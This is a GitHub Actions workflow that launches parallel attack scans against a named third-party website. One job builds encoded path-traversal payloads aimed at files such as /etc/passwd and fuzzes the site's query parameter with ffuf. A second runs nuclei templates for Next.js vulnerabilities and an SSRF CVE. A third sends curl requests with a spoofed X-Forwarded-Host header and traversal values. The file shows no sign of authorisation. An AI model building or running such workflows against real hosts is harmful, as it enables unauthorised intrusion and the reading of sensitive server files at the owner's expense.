name: "Heavy-Duty Middleware Escalation (Parallel)"

on:
  workflow_dispatch:

permissions:
  contents: write
  issues: write
  actions: read

jobs:
  # Job 1: Fuzzing for Path Traversal & Logic Bypass
  fuzz_traversal:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install FFUF
        run: go install github.com/ffuf/ffuf/v2@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: ğŸ“ WAF Bypass Payloads
        run: |
          cat <<EOF > payloads.txt
          ..%2f..%2f..%2fetc/passwd
          ..%5c..%5c..%5cwindows/win.ini
          .%2e/%2e%2e/%2e%2e/etc/passwd
          ..%252f..%252f..%252fetc/passwd
          ..%c0%af..%c0%afetc/passwd
          %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
          EOF

      - name: ğŸ¯ Parallel Fuzz
        run: |
          ffuf -u "https://academy.openai.com/?amp=FUZZ" \
               -w payloads.txt -mc 200,500,403 -v -o traversal_results.json

      - name: ğŸ“¤ Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: traversal-results
          path: traversal_results.json

  # Job 2: Testing for SSRF and Next.js Specific CVEs
  nuclei_scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install Nuclei
        run: go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$(go env GOPATH)/bin" >> $GITHUB_PATH

      - name: â˜¢ï¸ Scan for SSRF/Next.js CVEs
        run: |
          nuclei -u "https://academy.openai.com/?amp=test" \
            -t http/vulnerabilities/nextjs/ \
            -t http/cves/2024/CVE-2024-34351.yaml \
            -o nuclei_results.txt

      - name: ğŸ“¤ Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: nuclei-results
          path: nuclei_results.txt

  # Job 3: Advanced Header Smuggling
  header_smuggling:
    runs-on: ubuntu-latest
    steps:
      - name: ğŸ•µï¸ Test Header Interaction
        run: |
          # Testing for HTTP Parameter Pollution and Host Injection
          curl -v -I "https://academy.openai.com/?amp=1234" -H "X-Forwarded-Host: 127.0.0.1" > header_test_1.txt
          curl -v -I "https://academy.openai.com/?amp=1234&amp=../../etc/passwd" > header_test_2.txt
          
      - name: ğŸ“¤ Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: header-smuggling-results
          path: header_test_*.txt
          
